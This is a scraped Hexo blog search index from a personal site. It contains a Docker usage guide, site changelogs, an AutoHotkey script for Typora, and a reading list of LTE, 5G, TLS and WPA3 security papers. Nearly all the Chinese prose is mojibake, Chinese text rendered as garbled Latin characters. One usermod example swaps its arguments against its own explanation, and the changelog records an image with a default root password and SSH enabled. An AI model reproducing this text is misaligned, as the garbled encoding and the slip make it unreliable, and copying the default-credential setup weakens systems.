å°„æœ¬åœ°ç›®å½•å¦‚ä½•å®ç°?ç­”:åˆ æ‰å®¹å™¨é‡æ–°åˆ›å»º(å¦‚æœæ˜¯åˆšå¼€å§‹)åˆ é™¤ç°æœ‰çš„å®¹å™¨é‡æ–°åˆ›å»ºå®¹å™¨æŸ¥çœ‹å®¹å™¨çš„ç›¸ä¿¡ä¿¡æ¯å¯¹ç°æœ‰å®¹å™¨æ„å»ºé•œåƒï¼Œå†ä»è¿™ä¸ªé•œåƒé‡æ–°å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨å¯¹ç°æœ‰çš„å®¹å™¨è¿›è¡Œä¿å­˜é•œåƒåˆ é™¤åŸæœ‰çš„å®¹å™¨é€šè¿‡æ–°é•œåƒ,ç”Ÿæˆæ–°çš„å®¹å™¨æŸ¥çœ‹æ–°å®¹å™¨çš„ç›¸å…³é…ç½®ä¿¡æ¯æ›´æ”¹ç°æœ‰å®¹å™¨çš„é…ç½®æ–‡ä»¶ä¿®æ”¹ç°æœ‰é…ç½®éœ€è¦é‡å¯æ•´ä¸ªdocker,ä¼šå½±å“åˆ°å…¶ä»–æ­£åœ¨è¿è¡Œçš„å®¹å™¨ ä¸€é—®ä¸€ç­” é—®é¢˜ä¸‰: æˆ‘å·²ç»åˆ›å»ºå®Œå®¹å™¨äº†å¹¶è®¾ç½®äº†æ–‡ä»¶å¤¹æ˜ å°„,ä½†æˆ‘æƒ³å¾€è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œæ·»åŠ æ–‡ä»¶å´æç¤ºæ²¡æœ‰æƒé™æ€ä¹ˆå›äº‹?ç­”:â€‹ æ²¡æœ‰åšåˆ›å»ºå®Œå®¹å™¨åè¿›å…¥å®¹å™¨,è¿›å…¥åˆ°æ˜ å°„åçš„è·¯å¾„,ç»™è¿™ä¸ªæ–‡ä»¶å¤¹èµ‹äºˆç»„æƒé™(wxr)â€‹ ä¾‹å¦‚:â€‹ docker run -dit -v /home/siz/test1:/home/siz b19â€‹ åšå®Œæ˜ å°„å, éœ€æ‰§è¡Œ$ docker attach &lt;æ–°åˆ›å»ºå®¹å™¨_id> $ cd /home/siz $ chmod g+wxr ./test1 # æ‰§è¡Œå®Œè¿™ä¸ªè¿‡ç¨‹å, åœ¨å®¹å™¨å¤–çš„ç”¨æˆ·æ‰æœ‰æƒé™å»ä¿®æ”¹åˆ›å»ºæ–‡ä»¶!!!! å½“åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å‘ç°ä¸€ä¸ªæ–°çš„é—®é¢˜: å³ç»„å†…æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶åœ¨å®¹å™¨ä¸­å› ä¸ºæ²¡æœ‰ç›¸åº”çš„uid:gid æ˜ å°„, å¹¶ä¸”å®¹å™¨ä¸­çš„rootç”¨æˆ·çš„æƒé™å¾ˆä½æ—¶(ç»„ç®¡ç†å‘˜æ‹¥æœ‰sudoæƒé™,ä½†éœ€è¦è¾“å…¥sudoæ‰å¯ä»¥; è€Œå®¹å™¨ä¸­æ—¶æ²¡æœ‰sudoå‘½ä»¤çš„,æ‰€æœ‰è¯´è¿™é‡Œçš„rootæƒé™å¾ˆä½)åœ¨è¿™ç§æƒ…å†µä¸‹: å°±ä¼šå‡ºç°æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶,åœ¨å®¹å™¨ä¸­è¢«è¯†åˆ«ä¸º: `nobody ,nogroups ç°è±¡ æš‚æ—¶çš„è§£å†³æ–¹æ³• æ™®é€šç”¨æˆ·åˆ é™¤ç§æœ‰ç»„,å³è®©æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä¸º(dockerå®¹å™¨æ˜ å°„çš„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„)â€‹ ä¾‹å¦‚: æœ¬æ–‡æ¼”ç¤ºå°ç»„ç®¡ç†å‘˜ä¸ºsiz, ç»„åä¸º(siz) åˆ™è®© æ™®é€šç”¨æˆ·test&lt;xxx&gt; çš„ä¸»ç»„ä¸ºsiz# å‘½ä»¤: sudo usermod -g &lt;å°ç»„ç®¡ç†å‘˜åç§°> &lt;æ™®é€šç”¨æˆ·åç§°> # å°†æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä»ç§æœ‰ç»„æ”¹ä¸ºå°ç»„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„ $ sudo usermod -g test1 sizå¯¹å®¿ä¸»æœº(å®¹å™¨å¤–)ç»„æˆå‘˜ä¸­æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™ç›®çš„: ä½¿å®¹å™¨å†…rootè·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹(w) æƒé™ $ chmod g+wxr &lt;xxx>å¯¹å®¹å™¨å†…root åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™ç›®çš„: ä½¿å®¿ä¸»æœº(å®¹å™¨å¤–) ç»„æˆå‘˜æ™®é€šç”¨æˆ·è·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹(w) æƒé™$ chmod g+wxr &lt;xxx>ç¼ºé™·:å½“å†…å¤–åˆ›å»ºæ–°çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä½¿, å†…å¤–è¦ä¸æ–­çš„ä½¿ç”¨chmod å‘½ä»¤è¿›è¡Œæˆæƒ, åˆ›å»ºæ—¶å¼€å¯ç«¯å£æ˜ å°„ # å°† å®¹å™¨ä¸­çš„ 80ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„8080ç«¯å£ # æ ¼å¼ -p 8080:80 $ docker run -dit -p 8080:80 --name siztest sizaif2000/ubuntu20004v1:1.0 ä¸€é—®ä¸€ç­” é—®é¢˜äºŒ: å¦‚æœæˆ‘å·²ç»åˆ›å»ºå®Œå®¹å™¨äº†, æˆ‘å†æƒ³è¿½åŠ ç«¯å£æ˜ å°„æ€ä¹ˆå®ç°?ç­”:åˆ æ‰å®¹å™¨é‡æ–°åˆ›å»º(å¦‚æœæ˜¯åˆšå¼€å§‹)åˆ é™¤ç°æœ‰çš„å®¹å™¨é‡æ–°åˆ›å»ºå®¹å™¨æŸ¥çœ‹å®¹å™¨çš„ç›¸ä¿¡ä¿¡æ¯å¯¹ç°æœ‰å®¹å™¨æ„å»ºé•œåƒï¼Œå†ä»è¿™ä¸ªé•œåƒé‡æ–°å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨å¯¹ç°æœ‰çš„å®¹å™¨è¿›è¡Œä¿å­˜é•œåƒåˆ é™¤åŸæœ‰çš„å®¹å™¨é€šè¿‡æ–°é•œåƒ,ç”Ÿæˆæ–°çš„å®¹å™¨æŸ¥çœ‹æ–°å®¹å™¨çš„ç›¸å…³é…ç½®ä¿¡æ¯æ›´æ”¹ç°æœ‰å®¹å™¨çš„é…ç½®æ–‡ä»¶ä¿®æ”¹ç°æœ‰é…ç½®éœ€è¦é‡å¯æ•´ä¸ªdocker,ä¼šå½±å“åˆ°å…¶ä»–æ­£åœ¨è¿è¡Œçš„å®¹å™¨ #ä½¿ç”¨runæ–¹å¼åœ¨åˆ›å»ºæ—¶è¿›å…¥ $ docker run -it centos /bin/bash #å…³é—­å®¹å™¨å¹¶é€€å‡º $ exit #ä»…é€€å‡ºå®¹å™¨ï¼Œä¸å…³é—­ # å¿«æ·é”®ï¼šCtrl + P + Q #ç›´æ¥è¿›å…¥centos å®¹å™¨å¯åŠ¨å‘½ä»¤çš„ç»ˆç«¯ï¼Œä¸ä¼šå¯åŠ¨æ–°è¿›ç¨‹ï¼Œå¤šä¸ªattachè¿æ¥å…±äº«å®¹å™¨å±å¹•ï¼Œå‚æ•°ï¼š--sig-proxy=false ç¡®ä¿CTRL-Dæˆ–CTRL-Cä¸ä¼šå…³é—­å®¹å™¨ $ docker attach --sig-proxy=false centos #åœ¨ centos å®¹å™¨ä¸­æ‰“å¼€æ–°çš„äº¤äº’æ¨¡å¼ç»ˆç«¯ï¼Œå¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹ï¼Œå‚æ•°ï¼š-i å³ä½¿æ²¡æœ‰é™„åŠ ä¹Ÿä¿æŒSTDIN æ‰“å¼€ï¼›-t åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ $ docker exec -i -t centos /bin/bash #ä»¥äº¤äº’æ¨¡å¼åœ¨å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œç»“æœè¿”å›åˆ°å½“å‰ç»ˆç«¯å±å¹• $ docker exec -i -t centos ls -l /tmp #ä»¥åˆ†ç¦»æ¨¡å¼åœ¨å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œç¨‹åºåå°è¿è¡Œï¼Œç»“æœä¸ä¼šåé¦ˆåˆ°å½“å‰ç»ˆç«¯ $ docker exec -d centos touch cache.txt # å¸¸ç”¨è¿›å…¥å‘½ä»¤ $ docker exec -it [container_id] /bin/bash # æˆ–è€… ä½¿ç”¨attach å‘½ä»¤ # æ³¨æ„!!!! ä½¿ç”¨ attachå‘½ä»¤æ—¶, é¡»åœ¨runåˆ›å»ºå®¹å™¨çš„æ—¶å€™å¸¦æœ‰ -it å‚æ•°, è´Ÿè´£ä¼šå‡ºç°è¿›å…¥å®¹å™¨åæ— æ³•äº¤äº’è¾“å…¥å‘½ä»¤çš„æƒ…å†µ $ docker attach [container_id]# æ³¨ï¼šcontainerIdä¸ºéœ€è¦æ‰“åŒ…çš„å®¹å™¨idï¼Œ # imagename ä¸º æ‰“åŒ…çš„é•œåƒåç§°;å¯æ·»åŠ tagå‚æ•°, ä¾‹å¦‚ testv1:1.0 $ docker commit [container_Id] imagename#åœæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ $ docker stop redis #æ€æ‰ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ $ docker kill redis #åˆ é™¤ä¸€ä¸ªå·²åœæ­¢çš„å®¹å™¨ $ docker rm redis #åˆ é™¤ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ $ docker rm -f redis #åˆ é™¤å¤šä¸ªå®¹å™¨ $ docker rm -f $(docker ps -a -q) $ docker ps -a -q | xargs docker rm # -l ç§»é™¤å®¹å™¨é—´çš„ç½‘ç»œè¿æ¥ï¼Œè¿æ¥åä¸º db $ docker rm -l db # -v åˆ é™¤å®¹å™¨ï¼Œå¹¶åˆ é™¤å®¹å™¨æŒ‚è½½çš„æ•°æ®å· $ docker rm -v redis ä¿®è®¢å†å² 2023-08-21 11:18:42 å¢åŠ dockeråˆ›å»ºå®¹å™¨-Vscodeç¼–è¾‘å™¨ç›´æ¥æ‰“å¼€ 2022-10-09 09:35:00 æ„å»ºåŸºç¡€é•œåƒbasic-ubuntu2004v3:1.0ç‰ˆæœ¬å®ç°é»˜è®¤ç”¨æˆ·rootï¼Œé»˜è®¤å¯†ç root123è‡ªåŠ¨å¼€å¯sshæœåŠ¡å™¨å¹¶æŒä¹…åŒ–çŠ¶æ€ä¸ºå¼€å¯ 2021-09-23 ä¿®å¤æ˜ å°„æ–‡ä»¶å¤¹è·¯å¾„æƒé™é—®é¢˜ ä¿®å¤æ—¥å¿— 2021-09-17 æ„å»ºåŸºç¡€é•œåƒubuntu2004v2:2.0ç‰ˆæœ¬æ„å»ºåŸºç¡€é•œåƒubuntu2004v1:2.0ç‰ˆæœ¬æ·»åŠ åŸºç¡€é•œåƒlatestç‰ˆæœ¬å¢åŠ å¯åŠ¨é•œåƒ 2021-09-16 æ·»åŠ ç¬¬ä¸€ç‰ˆæ‰‹å†Œ"},{"title":"","date":"2021-08-06T16:01:23.000Z","updated":"2021-08-09T08:19:55.000Z","comments":true,"path":"page/friends/index.html","permalink":"https://www.sizaif.com/page/friends/","excerpt":"ç›¸èšçŸ­æš‚ï¼Œå­¤ç‹¬å¸¸æ€ã€‚","text":"ç›¸èšçŸ­æš‚ï¼Œå­¤ç‹¬å¸¸æ€ã€‚ &nbsp;ä¸¾ä¸ªæ —å­&nbsp;å‰ç½®è¦æ±‚ &nbsp;æœ¬ç«™ä¿¡æ¯ å‹é“¾æ ¼å¼ï¼Œé™¤é«˜äº®è¡Œï¼Œå…¶ä½™å‡å¯é€‰~- title: # ç½‘ç«™åç§° url: # è®¿é—®åœ°å€ avatar: # å¤´åƒåœ°å€ description: # æè¿°/ä¸€å¥è¯æ¦‚è¿°/æ ¼è¨€ screenshot: # ç½‘ç«™æˆªå›¾/å±•ç¤ºå›¾ backgroundColor: # å¤´åƒèƒŒæ™¯é¢œè‰² textColor: # æ–‡æœ¬é¢œè‰² keywords: - æ ‡ç­¾ä¸€ - æ ‡ç­¾äºŒ æœ‰å®è´¨æ€§åŸåˆ›å†…å®¹çš„ HTTPS ç«™ç‚¹ åˆæ³•çš„ã€éè¥åˆ©æ€§ã€æ— å•†ä¸šå¹¿å‘Šï¼‰ è®¿é—®åœ°å€ï¼šhttps://www.sizaif.com/ ç«™ç‚¹åç§°ï¼šSizaif's Blog å¤´åƒåœ°å€ï¼šhttps://gitee.com/sizaif/images/raw/master/img/20210807132935.jpeg æè¿°ä¿¡æ¯ï¼šæ˜¥æ±Ÿæ½®æ°´è¿æµ·å¹³,æµ·ä¸Šæ˜æœˆå…±æ½®ç”Ÿ"},{"title":"Hexo_typora_ahk_bak","date":"2021-11-24T13:34:29.000Z","updated":"2021-11-24T13:39:49.652Z","comments":true,"path":"page/hexo_typora_ahk_bak/index.html","permalink":"https://www.sizaif.com/page/hexo_typora_ahk_bak/","excerpt":"","text":"; Typora ; å¿«æ·è®¾ç½®å…¼å®¹hexoæ ¼å¼ ; SendInput &#123;Text&#125; è§£å†³ä¸­æ–‡è¾“å…¥æ³•é—®é¢˜ #IfWinActive ahk_exe Typora.exe &#123; ; ctrl+1 tab ^1::addtabcode() ; ctrl+2 note ^2::addnotecode() ; ctrl+3 folding ^3::addfoldingcode() ; ctrl+4 link ^4::addlinkcode() ; ctrl+5 span ^5::addspancode() ; ctrl+6 radio ^6::addradiocode() ; Alt+1 æ©™è‰² !1::addFontColor(\"orange\") ; Alt+2 çº¢è‰² !2::addFontColor(\"red\") ; Alt+3 æµ…è“è‰² !3::addFontColor(\"cornflowerblue\") ; Alt+4 æ£•è‰² !4::addFontColor(\"brown\") ; Alt+5 ç»¿è‰² !5::addFontColor(\"green\") ; Alt+6 ç´«è‰² !6::addFontColor(\"purple\") &#125; ; å¿«æ·è®¾ç½®tab addtabcode()&#123; clipboard := \"&#123;% tabs tab-id %&#125;`n`t&lt;!-- tab 1 -->`nreplace`n&lt;!-- endtab -->`n&lt;!-- tab 2 -->`nreplace`n&lt;!-- endtab -->`n&#123;% endtabs %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®note addnotecode()&#123; clipboard := \"&#123;% note danger:: note error/danger %&#125;`n&#123;% note success:: note done/success %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®folding addfoldingcode()&#123; clipboard := \"&#123;% folding green:: code %&#125;`n&#123;% endfolding %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®link addlinkcode()&#123; clipboard := \"&#123;% link title:: link %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®span addspancode()&#123; clipboard := \"&#123;% span parm:: txt %&#125;\" Send ^v return &#125; ; å¿«æ·è®¾ç½®radio addradiocode()&#123; clipboard := \"&#123;% radio green checked:: text %&#125;\" Send ^v return &#125; ; å¿«æ·å¢åŠ å­—ä½“é¢œè‰² addFontColor(color)&#123; clipboard := \"\" ; æ¸…ç©ºå‰ªåˆ‡æ¿ Send &#123;ctrl down&#125;c&#123;ctrl up&#125; ; å¤åˆ¶ SendInput &#123;TEXT&#125;&lt;font color='%color%'> SendInput &#123;ctrl down&#125;v&#123;ctrl up&#125; ; ç²˜è´´ If(clipboard = \"\")&#123; SendInput &#123;TEXT&#125;&lt;/font> ; Typora åœ¨è¿™ä¸ä¼šè‡ªåŠ¨è¡¥å…… &#125;else&#123; SendInput &#123;TEXT&#125;&lt;/ ; Typoraä¸­è‡ªåŠ¨è¡¥å…¨æ ‡ç­¾ &#125; &#125;"},{"title":"å»º ç«™ å²","date":"2021-08-07T05:00:34.000Z","updated":"2021-09-20T01:36:46.732Z","comments":true,"path":"page/history/index.html","permalink":"https://www.sizaif.com/page/history/","excerpt":"","text":"2021-09-20 ä¿®å¤æ¯æ—¥è¯´è¯´ç•Œé¢ 2021-09-19 æ·»åŠ æš—é»‘æ¨¡å¼,å³é”®ç‚¹å‡»åˆ‡æ¢å›¾ç‰‡ç”±pngåˆ‡æ¢ä¸ºwebp,å¢åŠ è®¿é—®é€Ÿåº¦ 2021-09-17 å¢åŠ é˜…è¯»æ¨¡å¼ç®€åŒ–èƒŒæ™¯å›¾æ ·å¼é‡æ„ 2021-08-16 cssä¼˜åŒ–,åšæ–‡æ ‡é¢˜å±…ä¸­æ ‡ç­¾å’Œå½’æ¡£æ•´åˆåˆ°å½’æ¡£ä¸­ 2021-08-14 å°è¯•ä½¿ç”¨CDNåŠ é€Ÿå°†é¦–é¡µgiteeå›¾åºŠèƒŒæ™¯å›¾æ›´æ¢åˆ°æœ¬åœ°,åŠ å¿«åŠ è½½é€Ÿåº¦å¤§é‡ä½¿ç”¨æœ¬åœ°å›¾ç‰‡ 2021-08-14 ä½¿ç”¨hexo-abbrlinkæ’ä»¶,ä¿®æ”¹æ–‡ç« é“¾æ¥åœ°å€å”¯ä¸€ 2021-08-13 æ›´æ¢è¯„è®ºç³»ç»Ÿç”± valine æ›´æ¢ä¸º Waline, å¢åŠ å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ 2021-08-10 éƒ¨åˆ†åšå®¢ä»CSDNæ¬è¿è¿‡æ¥ 2021-08-09 å›¾æ ‡æ ·å¼ä¿®æ”¹ fas-&gt;fadæ·»åŠ å‹é“¾(å°ä¼™ä¼´ç•Œé¢)æ·»åŠ ç•™è¨€æ¿åŠŸèƒ½æ·»åŠ æ¯æ—¥å¿ƒæƒ…(è¯´è¯´)åŠŸèƒ½æ·»åŠ å…³äº(æˆ‘) ç•Œé¢ 2021-08-08 é…ç½®ä»£ç é«˜äº®,ä»£ç èƒŒæ™¯å—é¢œè‰²ç»‘å®šåŸŸååˆ° www.sizaif.com 2021-08-07 ç¬¬ä¸€æ¬¡å»ºç«™é‡‡ç”¨ Volantis5.0.alpha ä¸»é¢˜"},{"title":"","date":"2021-08-07T02:43:15.000Z","updated":"2021-08-09T09:00:36.000Z","comments":true,"path":"page/messages/index.html","permalink":"https://www.sizaif.com/page/messages/","excerpt":"","text":"è¯·éµå®ˆç›¸å…³æ³•å¾‹æ³•è§„ï¼Œæ–‡æ˜çŒæ°´ï¼Œè°¢è°¢åˆä½œ~"},{"title":"More","date":"2021-08-06T16:08:12.000Z","updated":"2021-08-07T01:18:25.000Z","comments":true,"path":"page/more/index.html","permalink":"https://www.sizaif.com/page/more/","excerpt":"","text":""},{"title":"ç¬”è®°","date":"2021-08-06T15:48:11.000Z","updated":"2022-01-18T03:55:24.614Z","comments":true,"path":"page/notes/index.html","permalink":"https://www.sizaif.com/page/notes/","excerpt":"","text":"keyboard: å³é”®æ³¨å†Œè¡¨å¤‡ä»½vscode_bakhexo-typora_ahk_bakå¾®è½¯å°é¹¤åŒæ‹¼ æ¯å‘¨è®¡åˆ’WIFI&WPA34G&5G LTEçŠ¶æ€æœºå­¦ä¹ TLSå·®åˆ†æµ‹è¯•IOT 2022-01-01 -&gt; 2021-01-30 -&gt; é¡¹ç›®åˆä½œ&amp;&amp;è®ºæ–‡ é¡¹ç›®ï¼šç¬¬ä¸‰é˜¶æ®µè®¡åˆ’&amp;4G&amp;5G A Comprehensive Formal Analysis of 5G Handover SCOPE_ An Open and Soft warized Prototyping Platform for NextG Systems è®¡åˆ’&amp;çŠ¶æ€æœº Coverage-guided binary fuzzing with rev.ng and llvm libfuzzer æ¨¡å‹å­¦ä¹ ä¸ç¬¦å·æ‰§è¡Œç»“åˆçš„å®‰å…¨åè®®ä»£ç åˆ†ææŠ€æœ¯ FlexTLS A Tool for Testing TLS Implementations EPF_ An Evolutionary, Protocol-Aware, and Coverage-Guided Network Fuzzing Framework Fuzzing the Internet of Things_ A Review on the Techniques and Challenges for Efficient Vulnerability Discovery in Embedded Systems ProXray_ Protocol Model Learning and Guided Firmware Analysis Reviewing IoT Security via Logic Bugs in IoT Platforms and Systems æ•´ç†&amp;å®Œæˆï¼š StateAFL: Greybox Fuzzing for Stateful Network Servers åŸºäºæ¨¡å‹æ£€æµ‹çš„TLSåè®®å®ç°åº“å®‰å…¨æ€§åˆ†æ é¢å‘æœªçŸ¥åè®®çš„æµé‡è¯†åˆ«æŠ€æœ¯ç ”ç©¶_ç‹æ—­ä¸œ æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ç»¼è¿° 2021-12-01 -&gt; 2021-12-30 -&gt; é¡¹ç›®åˆä½œ&amp;&amp;è®ºæ–‡ é¡¹ç›®ï¼šç¬¬äºŒé˜¶æ®µ4G&amp;5G A Comprehensive Formal Analysis of 5G Handover Anonymous Device Authorization for Cellular Networks A Nationwide Census on WiFi Security Threats_ Prevalence, Riskiness, and the Economics CellScope_ Automatically Specifying and Verifying Cellular Network Protocols Discovering Emergency Call Pitfalls for Cellular Networks with Formal Methods Data-Plane Signaling in Cellular IoT_ Attacks and Defense DoLTEst In-depth Downlink Negative Testing Framework for LTE Devices Insecurity of Operational Cellular IoT Service_ New Vulnerabilities, Attacks, and Countermeasures Look Before You Leap_ Secure Connection Bootstrapping for 5G Networks to Defend Against Fake Base-Stations LTrack Stealthy Tracking of Mobile Phones in LTE SecureSIM_ Rethinking Authentication and Access Control for SIM_eSIM Security and privacy for 6G_ A survey on prospective technologies and challenges SCOPE_ An Open and Soft warized Prototyping Platform for NextG Systems Watching the Watchers Practical Video Identification Attack in LTE Networks çŠ¶æ€æœºï¼š StateAFL: Greybox Fuzzing for Stateful Network Servers HVLearn_Automated_Black-Box_Analysis_of_Hostname_Verification_in_SSL_TLS_Implementations Combining Model Learning and Model Checking to Analyze TCP Implementations 2021-11-06 -&gt; 2021-11-30 -&gt; é¡¹ç›®åˆä½œ 4G&amp;5G Noncompliance as Deviant Behavior_ An Automated Black-box Noncompliance Checker for 4G LTE Cellular Devices (DIKEUE) 5Greplay_ a 5G Network Traffic Fuzzer - Application to Attack Injection 5Greplayä»£ç é¡¹ç›®è·Ÿè¿› MMT-DPI NAS TS 24.501 åè®®è§„èŒƒ 2021-10-29 -&gt; 2021-11-05 4G&amp;5G Nori: Concealing the Concealed Identifier in 5G 2021-10-23 -&gt; 2021-10-29 4G&amp;5G 5Greplay_ a 5G Network Traffic Fuzzer - Application to Attack Injection Secure Open Fronthaul Interface for 5G Networks Nori: Concealing the Concealed Identifier in 5G 2021-10-16 -&gt; 2021-10-22 IOT: Rise of the Machines On the Security of Cellular IoT Devices master thesis TLSå·®åˆ†æµ‹è¯• SADT_ Syntax-Aware Differential Testing of Certificate Validation in SSL_TLS Implementations Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations è®¡åˆ’ A Chosen Random Value Attack on WPA3 SAE authentication protocol 2019-801 Active Dictionary Attack on WPA3-SAE Cryptanalysis of the Dragonfly key exchange protocol Dragonblood_ Analyzing the DragonflyHandshake of WPA3 and EAP-pwd Model based fuzzing of the WPA3 Dragonfly handshake master thesis On the Provable Security of the Dragonfly Protocol Simultaneous Deauthentication of Equals Attack 2021-11-06 -&gt; 2021-11-19 4G&amp;5G 5Greplay_ a 5G Network Traffic Fuzzer - Application to Attack Injection 5Greplayä»£ç é¡¹ç›®è·Ÿè¿› MMT-DPI NAS TS 24.501 åè®®è§„èŒƒ 5Gç³»ç»Ÿæ¶æ„5GS TS 23.501 åè®®è§„èŒƒ 5Gæ ¸å¿ƒç½‘5GC TS 23.502 åè®®è§„èŒƒ 2021-10-29 -&gt; 2021-11-05 4G&amp;5G Nori: Concealing the Concealed Identifier in 5G 2021-10-23 -&gt; 2021-10-29 4G&amp;5G 5Greplay_ a 5G Network Traffic Fuzzer - Application to Attack Injection Secure Open Fronthaul Interface for 5G Networks Nori: Concealing the Concealed Identifier in 5G 2021-10-09 -&gt; 2021-10-15 æ¯”è¾ƒå¯¹æ¯”ä¸¤ç¯‡æ–‡çŒ® Touching the Untouchables_ Dynamic Security Analysis of the LTE Control Plane Berserker ASN.1-based Fuzzing of Radio Resource Control Protocol for 4G and 5G æµ‹è¯•MACåè®®: Fuzzing Radio Resource Control messages in 5G and LTE systems master thesis ä½¿ç”¨æ·±åº¦å­¦ä¹ ä¸fuzzerç»“åˆèµ·æ¥æµ‹è¯•å·¥ä¸šä»¥å¤ªç½‘: SeqFuzzer_ An Industrial Protocol Fuzzing Framework from a Deep Learning Perspective 2021-09-17 -&gt; 2021-09-24 åŸºäºsrsLTE(ç‰¹å®šç‰ˆæœ¬)ä¿®æ”¹rrc.cæ–‡ä»¶ä»£ç  CSAI: Open-Source Cellular Radio Access Network Security Analysis Instrument srsRAN https://github.com/srsran/srsRAN 2021-09-05 -&gt; 2021-09-24 æ€»ç»“LTEç›¸å…³æ”»å‡»;æ±‡æ€»æˆPPTæŠ¥å‘Š. 2021-08-20 -&gt; 2021-08-31 å°ç»„è¡ŒåŠ¨å°ç»„è¡ŒåŠ¨:ç‹ :Breaking LTE on Layer Twoä¸‰ç§æ”»å‡»æ–¹å¼:(è¢«åŠ¨æ”»å‡»)èº«ä»½æ˜ å°„æ”»å‡»:å°†TMSIä¸RNTIåŒ¹é…(è¢«åŠ¨æ”»å‡»)ç½‘ç«™æŒ‡çº¹è¯†åˆ«: (æœ‰é™)è¯†åˆ«ç½‘ç«™è®¿é—®(ä¸»åŠ¨æ”»å‡»)LTEç”¨æˆ·æ•°æ®æ“çºµ:(æœ‰é™) DNSæ±¡æŸ“é‡å®šå‘æ¨:Bookworm Game Automatic Discovery of LTE Vulnerabilities Through Documentation Anèµµ :Touching the Untouchables_ Dynamic Security Analysis of the LTE Control Plane 2021-08-13 -&gt; 2021-08-20 å½¢å¼åŒ–åˆ†æ,ä»æ¶ˆæ¯æ—¥å¿—ä¸­æå–æ„å»ºæœ‰é™çŠ¶æ€æœºæ¨¡å‹,ä½¿ç”¨NuXmvåšæ¨¡å‹æ£€æŸ¥å’ŒProVerifåšåè®®éªŒè¯,ä»è€Œå‘ç°æ¼æ´ ProChecker-An-Automated-Security-and-Privacy-Analysis-Framework-for-4G-LTE-Protocol-Implementations 2021-08-07 -&gt; 2021-08-13 æ„å»ºä¸€ä¸ªæµ‹è¯•å¹³å°LEFT, é‡‡ç”¨ä¸‰ç§æ¨¡ç³Šæ–¹æ³•: é»‘ç›’æµ‹è¯•,å¨èƒæ¨¡å‹æ„ŸçŸ¥æ¨¡ç³Š,RLå¼•å¯¼æ¨¡ç³Š;é‡‡ç”¨å®¢æˆ·ç«¯-æœåŠ¡å™¨ç«¯æ¶æ„,æµ‹è¯•æœºå¯†æ€§,å¯ç”¨æ€§,æ¥éªŒè¯LEFTå¹³å°çš„å¯ç”¨æ€§ Emulation-Instrumented Fuzz Testing of 4G_LTE Android Mobile Devices Guided by Reinforcement Learning 2021-08-01 -&gt; 2021-08-06 å¯¹RRCæ¶ˆæ¯è¿›è¡Œæ¶ˆæ¯å†…å®¹/æ¨¡å¼è¿›è¡Œä¿®æ”¹,è¿›è¡Œæ¨¡ç³Šæµ‹è¯•: Berserker ASN.1-based Fuzzing of Radio Resource Control Protocol for 4G and 5G 2021-07-23 -&gt; 2021-07-30 åˆ†é…å±æ€§æ„å»ºæ¨¡å‹,åšæ¨¡å‹æ£€æŸ¥,æ£€æµ‹LTEéƒ¨ç½²ä¸­çš„å®‰å…¨æ¼æ´ On the Challenges of Automata Reconstruction in LTE Networks 2021-12-01 -&gt; 2021-12-02 ProFuzzBench/StateAFL A Greybox Fuzzer for Network Protocols ProFuzzBench: A Benchmark for Stateful Protocol Fuzzing StateAFL: Greybox Fuzzing for Stateful Network Servers 2021-07-11 -&gt; 2021-07-17 ProFuzzBench/AFLnet&amp;AFLnwe AFLNET: A Greybox Fuzzer for Network Protocols American fuzzy lop 2021-05-28 -&gt; 2021-06-11 TLS-Attacker Protocol state fuzzing of TLS implementations Analysis of DTLS Implementations Using Protocol State Fuzzing 2021-05-20 -&gt; 2021-05-27 æ”¹è¿›è®¡åˆ’ç¬¬ä¸€æ¬¡å°è¯• Protocol state fuzzing of TLS implementations Analysis of DTLS Implementations Using Protocol State Fuzzing 47 Systematic Fuzzing and Testing of TLS Libraries 2021-05-17 -&gt; 2021-05-20 IPSec_VPNå®‰å…¨æ€§æ¼æ´åˆ†æåŠéªŒè¯_å‘¨ç›Šæ—» 2021-04-30 -&gt; 2021-05-17 äº†è§£TLS&amp;DTLS Protocol state fuzzing of TLS implementations Analysis of DTLS Implementations Using Protocol State Fuzzing 2021-04-23 -&gt; 2021-04-30 åˆè¯†çŠ¶æ€æœº 45 åŸºäºL_å­¦ä¹ ç®—æ³•çš„å®‰å…¨åè®®è‡ªé€‚åº”æ¨¡å‹æ£€æµ‹æŠ€æœ¯ç ”ç©¶ åŸºäºæ¨¡å‹å­¦ä¹ çš„OpenVPNç³»ç»Ÿè„†å¼±æ€§åˆ†æ 64 Model Learning and Model Checking of IPSec Implementations for Internet of Things åŸºäºLå­¦ä¹ ç®—æ³•çš„å®‰å…¨åè®®è‡ªé€‚åº”æ¨¡å‹æ£€æµ‹æŠ€æœ¯ç 